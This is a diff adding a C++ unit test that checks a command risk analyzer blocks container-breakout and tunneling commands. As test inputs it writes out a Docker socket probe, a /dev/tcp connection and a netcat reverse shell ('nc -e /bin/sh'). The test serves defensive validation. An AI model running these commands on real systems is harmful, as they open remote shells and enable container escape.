@@ -56,6 +56,23 @@ TEST(RiskAnalyzerTest, CatastrophicDeletionsBlockedImmediately) {
     EXPECT_FALSE(v4.is_allowed);
 }
 
+TEST(RiskAnalyzerTest, BreakoutAndTunnelingBlockedImmediately) {
+    RiskAnalyzer analyzer;
+
+    ValidationResult v1 = analyzer.validate("ls -l /var/run/docker.sock");
+    EXPECT_FALSE(v1.is_allowed);
+    EXPECT_FALSE(v1.is_valid);
+    EXPECT_EQ(v1.risk_level, RiskLevel::High);
+
+    ValidationResult v2 = analyzer.validate("cat < /dev/tcp/10.0.0.1/80");
+    EXPECT_FALSE(v2.is_allowed);
+    EXPECT_FALSE(v2.is_valid);
+
+    ValidationResult v3 = analyzer.validate("nc -e /bin/sh 10.0.0.1 4444");
+    EXPECT_FALSE(v3.is_allowed);
+    EXPECT_FALSE(v3.is_valid);
+}
+
 TEST(RiskAnalyzerTest, EmptyAndHugeCommandsRejected) {
     RiskAnalyzer analyzer;
 
